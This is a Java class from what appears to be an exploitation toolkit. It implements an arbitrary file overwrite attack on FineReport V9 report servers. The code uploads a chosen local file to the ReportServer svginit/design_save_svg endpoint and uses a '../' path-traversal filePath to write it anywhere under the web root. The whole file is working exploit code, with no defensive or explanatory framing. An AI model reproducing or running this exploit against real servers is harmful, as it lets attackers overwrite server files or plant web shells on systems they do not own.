package com.droplab.Controller.FineReport.Service;

import com.alibaba.fastjson.JSON;
import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.HttpUtils;
import com.droplab.Utils.InfoUtils;
import com.droplab.Utils.ResponseUtils;
import com.droplab.service.BugService;
import org.jsoup.Connection;

import java.io.File;
import java.nio.file.Files;
import java.util.HashMap;
import java.util.Iterator;

/**
 * 帆软报表V9任意文件覆盖漏洞。
 */
public class V9FileOverWrite extends BugService {
    private final String uplpadContentPath="/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/%s";
    private String content="{\"__CONTENT__\":\"%s\",\"__CHARSET__\":\"UTF-8\"}";
    @Override
    public Object run(String type) {
        try {
            if (params.size() > 0) {
                String url = "";
                String filepath = null;
                String overFile = "";
                Iterator<String> iterator = params.keySet().iterator();
                while (iterator.hasNext()) {
                    String key = iterator.next();
                    if (key.equals("url")) {
                        url = params.get(key);
                    } else if (key.equals("filepath")) {
                        filepath = params.get(key);
                    } else if (key.equals("overFile")) {
                        overFile = params.get(key);
                    }
                }
                if(!url.equals("") && url !=null){
                    HashMap<String, String> headers = new HashMap<>();
                    CommonUtils.hashMapClone(InfoUtils.headers, headers);
                    headers.put("Referer", url+"/WebReport/ReportServer?op=fs");
                    headers.put("Content-Type","text/xml;charset=UTF-8");

                    byte[] bytes = Files.readAllBytes(new File(filepath).toPath());
                    String s = new String(bytes);
                    String replace = s.replace("\r\n", "").replace("\"","\\\"");
                    String format = String.format(content, replace);
                    String format1 = String.format(uplpadContentPath, overFile);
                    Connection.Response post = HttpUtils.post(url + format1, headers, format);
                    if(type.equals("exploit")){
                        return post;
                    }
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}
